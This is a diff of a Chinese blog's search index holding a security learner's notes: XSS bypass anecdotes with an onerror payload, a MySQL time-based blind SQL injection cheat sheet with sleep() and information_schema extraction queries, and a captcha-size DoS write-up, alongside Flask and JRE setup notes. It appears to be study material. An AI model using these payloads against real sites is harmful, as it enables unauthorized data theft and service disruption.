@@ -3,6 +3,66 @@
   
     
     <entry>
+      <title>【翻旧账】XSS姿势日常学习之PHP $_Request</title>
+      <link href="/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0POST/"/>
+      <url>/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0POST/</url>
+      <content type="html"><![CDATA[<h2 id="0×01-怎么开头"><a href="#0×01-怎么开头" class="headerlink" title="## 0×01 怎么开头"></a>## 0×01 怎么开头</h2><p>这个测试的对象说来很巧，原本站点是没有添加任何过滤的，直接通过在url末尾简单的绕过即可弹框。</p><blockquote><pre><code>http://www.test.com/test.php?name=&apos;&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre></blockquote><p>该漏洞已经修复，需要进行复测。</p><h2 id="0×02-难度升级"><a href="#0×02-难度升级" class="headerlink" title="## 0×02 难度升级"></a>## 0×02 难度升级</h2><p><img src="https://ooo.0o0.ooo/2017/07/05/595c89b939d9d.png" alt="fuce-01.png"></p><blockquote><p>上来访问一下就看到了这个，直接404，那么可能是已经修复了？还是链接已经失效(这个是自己YY的，可能点儿用没有2333)</p></blockquote><blockquote><p>修改为正常的url打开看看是什么情况。</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/07/05/595c8b537e3b5.png" alt="fuce-02.png"></p><blockquote><p>可以正常访问，那已经修复了？所以用xsstrike来跑跑，前几天从twitter上看到大家都在转，正好抓到机会来测试</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/07/05/595c8c13949bd.png" alt="fuce-03.png"></p><blockquote><p>看到这个的时候个人还觉得这也算修复了？果然还是被扫出来，换个姿势就可以，这么简单，结果就是浏览器打开的全是404，顿时就是各种卧槽。</p></blockquote><h2 id="0×03-去找大神"><a href="#0×03-去找大神" class="headerlink" title="## 0×03 去找大神"></a>## 0×03 去找大神</h2><blockquote><p>自己通过源码看到这里在通过url进行请求的时候，有一小段js是过滤掉了url中的字符，重定义到了404的。<br>还是去找大神,哈哈，因为总觉得还是可以弹窗的，尽管自己可能是YY。</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/07/05/595c8e32a3e6a.png" alt="fuce-04.png"></p><blockquote><p>大神告诉以下几点:  </p></blockquote><blockquote><ul><li>xsstrike 等xss扫描器只要不是基于webkit都是很容易误报的</li><li>这个点一开始自己用浏览器的js的解析逻辑，让后面的js先执行(目前看来没有方法)</li><li>不从js出发，猜php源码，结合js和源码，就可以得到答案</li><li>经过测试，后端是使用_requests来处理请求的，不是_get</li><li>所以问题的答案就很明显了</li></ul></blockquote><p>当吃在路上出完饭的我只能一路手机搜索，一路往回奔试试自己绞尽脑汁get到的点是不是对的，23333.还好，思路正确，没毛病。</p><p><img src="https://ooo.0o0.ooo/2017/07/05/595c9bb5dccdd.png" alt="fuce-06.png"></p><h2 id="0×04-欠一个payload"><a href="#0×04-欠一个payload" class="headerlink" title="## 0×04 欠一个payload"></a>## 0×04 欠一个payload</h2><h2 id="0×05-聊天记录就是最好的笔记了"><a href="#0×05-聊天记录就是最好的笔记了" class="headerlink" title="## 0×05 聊天记录就是最好的笔记了"></a>## 0×05 聊天记录就是最好的笔记了</h2><blockquote><pre><code>审计经验(php代码审计)php有集中获得请求的方式，_get,或者_post,还可能是_request尝试之后发现答案出来了</code></pre></blockquote><h4 id="“这个点需要一个脑洞，一点也不难-”"><a href="#“这个点需要一个脑洞，一点也不难-”" class="headerlink" title="#### “这个点需要一个脑洞，一点也不难.”"></a>#### “这个点需要一个脑洞，一点也不难.”</h4>]]></content>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>【翻旧账】XSS姿势日常学习</title>
+      <link href="/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/</url>
+      <content type="html"><![CDATA[<h2 id="0×01-叉插×"><a href="#0×01-叉插×" class="headerlink" title="## 0×01 叉插×"></a>## 0×01 叉插×</h2><p>看到P牛博客里有一篇wooyun的《那些年我们没能bypass的XSS filter》, 想整理过来但是好像也并没有必要这么做，先印象笔记搞一波，然后自己慢慢积累一些思路和套路.</p><p>这篇文章自己放在文件夹的最底层，竟然没有整理出来，尴尬……直到今天还是被我发现了。</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="### example-1"></a>### example-1</h3><p>修改自己的简历信息，用户名限制了50的长度</p><p><img src="https://ooo.0o0.ooo/2017/06/06/59366445b7a5d.png" alt="2017060501.png"></p><p>过滤了一些标签，img标签没有被过滤，所以尝试插入，查看源码的时候发现插入的英文标点符号被替换为了中文的，所以普通的姿势应该是搞不定的了，换个地方搞，特此记录.</p><p><img src="https://ooo.0o0.ooo/2017/06/06/59366445d1bf9.png" alt="2017060502.png"></p><h3 id="example-2"><a href="#example-2" class="headerlink" title="### example-2"></a>### example-2</h3><p>今天遇到的情况是，搜索框反射型XSS。</p><p>用AWVS扫到了存在XSS，然后就开始各种尝试，直到用firebug看到报错看到源码，接下来开始努力构造闭合创造alert(1)。所以闭合了，但是并没有弹窗，问我斌哥之后成功弹窗.</p><p><img src="https://ooo.0o0.ooo/2017/06/07/5937ff5b3b87f.png" alt="2017060601.png"></p><blockquote><p>So, 什么才是正确的姿势呢?<br>“要跳出到函数内的一些判断(if等)外，尝试跳出函数才是一个好的反射xss.不然需要交互.”</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/06/07/5937ff5b54b87.png" alt="2017060602.png"></p><blockquote><pre><code>和前一天相比,今天的过滤了&quot;&lt;&gt;&quot;这些符号，并对这些符号进行了转义.</code></pre></blockquote><h3 id="example-3"><a href="#example-3" class="headerlink" title="### example-3"></a>### example-3</h3><p>今天遇到的情况,AWVS告诉我此处有个XSS，为毛自己搞不出来捏?</p><p><img src="https://ooo.0o0.ooo/2017/06/09/593a04149cd37.png" alt="2017060801.png"><br><img src="https://ooo.0o0.ooo/2017/06/09/593a0414b45c5.png" alt="2017060802.png"></p><blockquote><p>两张图结合起来看,应该是极有可能存在XSS的，但是多次尝试之后无果，这里过滤掉了&lt;()等符号，所以又去问斌哥，斌哥乃何许人也，说时迟那时快，啧啧~</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/06/09/593a063b7fc7b.png" alt="2017060803.png"></p><p>所以又长见识了.</p><p><img src="https://ooo.0o0.ooo/2017/06/09/593a069481a55.png" alt="2017060804.png"></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>降级安装jre</title>
+      <link href="/2019/03/14/%E9%99%8D%E7%BA%A7%E5%AE%89%E8%A3%85jre/"/>
+      <url>/2019/03/14/%E9%99%8D%E7%BA%A7%E5%AE%89%E8%A3%85jre/</url>
+      <content type="html"><![CDATA[<h2 id="0x01-降级安装jre"><a href="#0x01-降级安装jre" class="headerlink" title="## 0x01 降级安装jre"></a>## 0x01 降级安装jre</h2><h3 id="卸载open-jdk"><a href="#卸载open-jdk" class="headerlink" title="### 卸载open-jdk"></a>### 卸载open-jdk</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卸载之前的java版本</span><br><span class="line">sudo apt-get remove openjdk*</span><br></pre></td></tr></table></figure><h3 id="降级安装"><a href="#降级安装" class="headerlink" title="### 降级安装"></a>### 降级安装</h3><ul><li><p>新建文件夹</p><blockquote><p>mkdir /usr/java/  </p></blockquote></li><li><p>下载rpm格式的jdk</p></li><li><p>安装</p><blockquote><p>rpm -ivh jdk-8u121-linux-x64.rpm –nodeps –force</p></blockquote></li><li><p>修改path配置文件</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">JAVA_HOME=/usr/java/jdk1.8.0_121</span><br><span class="line">JRE_HOME=/usr/java/jdk1.8.0_121/jre</span><br><span class="line">CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME CLASS_PATH PATH</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> environment </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>mysql ord()和ascii()</title>
+      <link href="/2019/03/12/mysql%E7%9B%B2%E6%B3%A8%E7%9A%84%E4%B8%80%E7%82%B9%E7%9F%A5%E8%AF%86/"/>
+      <url>/2019/03/12/mysql%E7%9B%B2%E6%B3%A8%E7%9A%84%E4%B8%80%E7%82%B9%E7%9F%A5%E8%AF%86/</url>
+      <content type="html"><![CDATA[<p>if(ascii(substr((‘str’),pos,len)),sleep(5),1)**</p><p>if(ascii(substr((‘str’),pos,len)),sleep(5),1)**</p><h2 id="0x00-语句"><a href="#0x00-语句" class="headerlink" title="# 0x00 语句"></a># 0x00 语句</h2><blockquote><p>if(ascii(substr((‘str’),pos,len)),sleep(5),1)</p></blockquote><h3 id="ASCII-str1"><a href="#ASCII-str1" class="headerlink" title="## ASCII(str1)"></a>## ASCII(str1)</h3><p>返回字符串的最左面字符串的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii('hi');</span><br><span class="line">+-------------+</span><br><span class="line">| ascii('hi') |</span><br><span class="line">+-------------+</span><br><span class="line">|         104 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ASCII('b')AS Lower_Case, ASCII('B') AS Upper_Case;</span><br><span class="line">+------------+------------+</span><br><span class="line">| Lower_Case | Upper_Case |</span><br><span class="line">+------------+------------+</span><br><span class="line">|         98 |         66 |</span><br><span class="line">+------------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="ord-str"><a href="#ord-str" class="headerlink" title="## ord(str)"></a>## ord(str)</h3><p>ord()函数返回字符串第一个字符的ASCII值。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ord('h');</span><br><span class="line">+----------+</span><br><span class="line">| ord('h') |</span><br><span class="line">+----------+</span><br><span class="line">|      104 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="substr"><a href="#substr" class="headerlink" title="## substr()"></a>## substr()</h3><p>substr()函数用来截取数据库中的某一列字段中的一部分。</p><p>substr(str,pos,len);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(('Courtney'),1,9);</span><br><span class="line">+--------------------------+</span><br><span class="line">| substr(('Courtney'),1,9) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| Courtney                 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="if-函数"><a href="#if-函数" class="headerlink" title="## if()函数"></a>## if()函数</h3><p>表达式为：if(expr1,expr2,expr3)</p><ul><li>如果expr1的值为true，则返回expr2的值；</li><li>如果expr1的值为false，则返回expr3的值；</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(ascii(substr(('L'),1,1))=0,1,sleep(3));</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| if(ascii(substr(('L'),1,1))=0,1,sleep(3)) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                         0 |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure><h2 id="0x01-其他常用"><a href="#0x01-其他常用" class="headerlink" title="## 0x01 其他常用"></a>## 0x01 其他常用</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">' and if(1=0,1, sleep(10)) --+    </span><br><span class="line"><span class="string">" and if(1=0,1, sleep(10)) --+</span></span><br><span class="line"><span class="string">) and if(1=0,1, sleep(10)) --+</span></span><br><span class="line"><span class="string">') and if(1=0,1, sleep(10)) --+</span></span><br><span class="line">") and if(1=0,1, sleep(10)) --+</span><br><span class="line">If(ascii(substr(database(),1,1))=115,sleep(10),1)</span><br><span class="line"></span><br><span class="line">获取数据库表信息</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;60 %23</span><br><span class="line">获取列信息</span><br><span class="line">and (select length(column_name) from information_schema.columns where table_name=0x656d61696c73 limit 0,1)&gt;[num] %23</span><br><span class="line">获取字段名</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name=0x656d61696c73 limit 0,1),1,1))&gt;60 %23</span><br><span class="line">获取当前记录的长度</span><br><span class="line">and (select count(*) from emails)&gt;0 %2</span><br></pre></td></tr></table></figure><h2 id="0x03-sqlmap-technique"><a href="#0x03-sqlmap-technique" class="headerlink" title="## 0x03 sqlmap technique"></a>## 0x03 sqlmap technique</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数：--technique</span><br><span class="line"></span><br><span class="line">这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</span><br><span class="line"></span><br><span class="line">支持的探测方式如下：</span><br><span class="line"></span><br><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>逻辑让我崩溃之越权姿势分享(续集)</title>
       <link href="/2019/02/06/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E8%B6%8A%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB(%E7%BB%AD%E9%9B%86)/"/>
       <url>/2019/02/06/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E8%B6%8A%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB(%E7%BB%AD%E9%9B%86)/</url>
@@ -12,6 +72,51 @@
         <tags>
             
             <tag> 越权姿势 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>FlaskDays-自定义url_for</title>
+      <link href="/2019/01/01/FlaskDays-%E8%87%AA%E5%AE%9A%E4%B9%89url_for/"/>
+      <url>/2019/01/01/FlaskDays-%E8%87%AA%E5%AE%9A%E4%B9%89url_for/</url>
+      <content type="html"><![CDATA[<h2 id="自定义url-for"><a href="#自定义url-for" class="headerlink" title="自定义url_for"></a>自定义url_for</h2><p>定义函数后，可以通过自定义一个类并添加到converter中，</p><ol><li>实现一个类，继承自“BaseConverter”；</li><li>在自定义类中，重写正则，也就是重写变量的正则表达式；</li><li>将自定义的类，映射到“app.url_map.converters”，示例：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TelephoneConveter</span><span class="params">(BaseConverter)</span>:</span></span><br><span class="line">    regex = <span class="string">r'1[85734]\d&#123;9&#125;'</span></span><br><span class="line"></span><br><span class="line">app.url_map.converters[<span class="string">'tel'</span>] = TelephoneConveter</span><br></pre></td></tr></table></figure><h3 id="to-python"><a href="#to-python" class="headerlink" title="to_python()"></a>to_python()</h3><p>将url中的参数经过解析传递给视图函数。</p><h3 id="to-url"><a href="#to-url" class="headerlink" title="to_url"></a>to_url</h3><p>将“url_for”反转的url参数放到url中。就是调用url_for函数生成符合要求的url格式。</p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> flask </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>FlaskDay-重定向</title>
+      <link href="/2019/01/01/FlaskDays-%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+      <url>/2019/01/01/FlaskDays-%E9%87%8D%E5%AE%9A%E5%90%91/</url>
+      <content type="html"><![CDATA[<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="永久性重定向"><a href="#永久性重定向" class="headerlink" title="永久性重定向"></a>永久性重定向</h3><p>http状态码301，如访问‘<a href="http://www.jingdong.com’会301重定向到‘www.jd.com’。" target="_blank" rel="noopener">www.jingdong.com’会301重定向到‘www.jd.com’。</a></p><h3 id="暂时性重定向"><a href="#暂时性重定向" class="headerlink" title="暂时性重定向"></a>暂时性重定向</h3><p>http状态码为302，如访问某站点直接访问‘我的订单’选项，会重定向到登陆页面。</p><h3 id="flask重定向"><a href="#flask重定向" class="headerlink" title="flask重定向"></a>flask重定向</h3><p>flask中，使用flask.redirect(location, code=302)实现重定向。默认是302暂时性重定向。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.route(&apos;/profile/&apos;, method=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def profile():</span><br><span class="line">name = request.args.get(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">if not name:</span><br><span class="line">return redirect(url_for(&apos;login&apos;))</span><br><span class="line">else:</span><br><span class="line">return name</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> flask </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>FlaskDays-Url补充</title>
+      <link href="/2019/01/01/FlaskDays-URL%E8%A1%A5%E5%85%85/"/>
+      <url>/2019/01/01/FlaskDays-URL%E8%A1%A5%E5%85%85/</url>
+      <content type="html"><![CDATA[<h2 id="指定访问网络和访问端口"><a href="#指定访问网络和访问端口" class="headerlink" title="指定访问网络和访问端口"></a>指定访问网络和访问端口</h2><p>修改host为0.0.0.0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Falsk(__name__)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello world."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(debug=<span class="keyword">True</span>, host=<span class="string">'0.0.0.0'</span>)</span><br><span class="line"><span class="comment">## Flask项目默认使用5000端口，也可以指定端口号</span></span><br><span class="line"><span class="comment"># app.run(debug=True, port=9999, host='0.0.0.0')</span></span><br></pre></td></tr></table></figure><h2 id="URL唯一"><a href="#URL唯一" class="headerlink" title="URL唯一"></a>URL唯一</h2><p>定义URL时，可以在访问路径后默认添加一个‘/’，原因两点：</p><ol><li>提高用户体验，添加‘/’后，可以匹配到用户访问的‘/user/’和‘/user’两种方式的请求；</li><li>搜索引擎会将有无‘/’划分为两种不同的url请求；</li></ol><h2 id="GET请求和POST请求"><a href="#GET请求和POST请求" class="headerlink" title="GET请求和POST请求"></a>GET请求和POST请求</h2><ol><li>GET请求：获取资源</li><li>POST请求：提交请求</li><li>传递参数：</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET请求：通过"?id=123"形式进行传递；</span><br><span class="line">POST请求：通过"Form Data"进行传递；</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：Flask route默认使用GET请求，可以通过method限定请求方法；<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/user/'</span>, method=[<span class="string">'GET'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"Hello world."</span></span><br></pre></td></tr></table></figure></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> flask </tag>
             
         </tags>
       
@@ -63,21 +168,6 @@
     </entry>
     
     <entry>
-      <title>图形验证码大小可控造成DOS攻击</title>
-      <link href="/2018/08/13/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7%E5%8F%AF%E9%80%A0%E6%88%90DOS%E6%94%BB%E5%87%BB/"/>
-      <url>/2018/08/13/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7%E5%8F%AF%E9%80%A0%E6%88%90DOS%E6%94%BB%E5%87%BB/</url>
-      <content type="html"><![CDATA[<h2 id="0x01-巧遇【新型漏洞】"><a href="#0x01-巧遇【新型漏洞】" class="headerlink" title="# 0x01 巧遇【新型漏洞】"></a># 0x01 巧遇【新型漏洞】</h2><p>次饭的时候看到知乎推了一篇文章，名为“<a href="https://zhuanlan.zhihu.com/p/41800341" target="_blank" rel="noopener">新类型【漏洞】验证码大小可控导致的拒绝服务攻击漏洞</a>”。</p><p>WTF，这不是刚刚正在测得图形验证码的地方么，竟然就看到这个文章了，你说巧不巧~~~</p><h2 id="0x02-发现问题"><a href="#0x02-发现问题" class="headerlink" title="# 0x02 发现问题"></a># 0x02 发现问题</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /userCenter/token/getImageToken.do?width=500&amp;height=20&amp;dt=Mon%20Aug%2013%202018%2011:32:46%20GMT+0800 HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br></pre></td></tr></table></figure><blockquote><p>GET请求中包含width和height参数，返回的相应内容即是刷新后的图形验证码。</p></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e03b953.png" alt="获取验证码"></p><p>参考<a href="">文章</a>中的思路，修改可控图形参数<strong>“width”</strong>和<strong>“height”</strong>，宽度扩大到百倍50000，对比返回包的大小和返回时间，如下所示；</p><blockquote><ul><li>width为500，height为200：</li></ul></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e0052db.png" alt="500*200"></p><blockquote><ul><li>width扩大100倍，height不变：</li></ul></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e03c862.png" alt="50000*200"></p><blockquote><p><strong>清晰的看到，返回包的大小从5000 bytes增加到了45000 bytes，时间从0.141s变成了1.462s</strong></p></blockquote><p>再次尝试将height扩大10倍，再看请求的延时会增加多少。</p><blockquote><p><strong>返回大小为420139 bytes，时间变为9.073s</strong></p></blockquote><p><img src="https://i.loli.net/2018/08/13/5b712615490d1.png" alt="50000*2000"></p><h2 id="0x03-验证问题"><a href="#0x03-验证问题" class="headerlink" title="# 0x03 验证问题"></a># 0x03 验证问题</h2><blockquote><ul><li>使用Intruder重放上一请求10次，使用另一IP访问网站资源，发现文字类的加载为常规速度，但附属的所有图片类资源的加载延迟特别高；</li><li>关闭重放攻击后，使用上一步IP访问网站，文章和图片均加载速度回归常速，可判断问题确实存在。</li><li><strong>因为文字类和图片的加载速度差异，可猜测图片服务部署在一个单独服务器中的可能性很大。</strong></li></ul></blockquote>]]></content>
-      
-      
-        <tags>
-            
-            <tag> DOS </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
       <title>【One Poc One Day】—— Struts 048</title>
       <link href="/2018/08/13/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94%20Struts%20048/"/>
       <url>/2018/08/13/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94%20Struts%20048/</url>
@@ -87,6 +177,21 @@
         <tags>
             
             <tag> poc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>图形验证码大小可控造成DOS攻击</title>
+      <link href="/2018/08/13/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7%E5%8F%AF%E9%80%A0%E6%88%90DOS%E6%94%BB%E5%87%BB/"/>
+      <url>/2018/08/13/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7%E5%8F%AF%E9%80%A0%E6%88%90DOS%E6%94%BB%E5%87%BB/</url>
+      <content type="html"><![CDATA[<h2 id="0x01-巧遇【新型漏洞】"><a href="#0x01-巧遇【新型漏洞】" class="headerlink" title="# 0x01 巧遇【新型漏洞】"></a># 0x01 巧遇【新型漏洞】</h2><p>次饭的时候看到知乎推了一篇文章，名为“<a href="https://zhuanlan.zhihu.com/p/41800341" target="_blank" rel="noopener">新类型【漏洞】验证码大小可控导致的拒绝服务攻击漏洞</a>”。</p><p>WTF，这不是刚刚正在测得图形验证码的地方么，竟然就看到这个文章了，你说巧不巧~~~</p><h2 id="0x02-发现问题"><a href="#0x02-发现问题" class="headerlink" title="# 0x02 发现问题"></a># 0x02 发现问题</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /userCenter/token/getImageToken.do?width=500&amp;height=20&amp;dt=Mon%20Aug%2013%202018%2011:32:46%20GMT+0800 HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br></pre></td></tr></table></figure><blockquote><p>GET请求中包含width和height参数，返回的相应内容即是刷新后的图形验证码。</p></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e03b953.png" alt="获取验证码"></p><p>参考<a href="">文章</a>中的思路，修改可控图形参数<strong>“width”</strong>和<strong>“height”</strong>，宽度扩大到百倍50000，对比返回包的大小和返回时间，如下所示；</p><blockquote><ul><li>width为500，height为200：</li></ul></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e0052db.png" alt="500*200"></p><blockquote><ul><li>width扩大100倍，height不变：</li></ul></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e03c862.png" alt="50000*200"></p><blockquote><p><strong>清晰的看到，返回包的大小从5000 bytes增加到了45000 bytes，时间从0.141s变成了1.462s</strong></p></blockquote><p>再次尝试将height扩大10倍，再看请求的延时会增加多少。</p><blockquote><p><strong>返回大小为420139 bytes，时间变为9.073s</strong></p></blockquote><p><img src="https://i.loli.net/2018/08/13/5b712615490d1.png" alt="50000*2000"></p><h2 id="0x03-验证问题"><a href="#0x03-验证问题" class="headerlink" title="# 0x03 